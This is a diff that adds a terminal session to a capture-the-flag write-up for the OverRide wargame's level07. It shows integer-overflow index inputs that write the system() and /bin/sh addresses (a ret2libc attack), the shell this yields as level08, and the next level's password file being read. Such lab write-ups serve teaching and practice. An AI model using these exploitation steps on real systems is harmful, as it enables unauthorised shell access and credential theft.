@@ -59,4 +59,31 @@ We can't use 114 as index because it's divisible by 3. But we con overflow integ
 ```
 So now we should store the address of system function (0xf7e6aed0 == 4159090384) to index 114 (1073741938) and
 address of /bin/sh (0xf7f897ec == 4160264172) to index 116. After exit from the program, the next eip will be the address of system function.
+```
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
 Aaaand we're done.
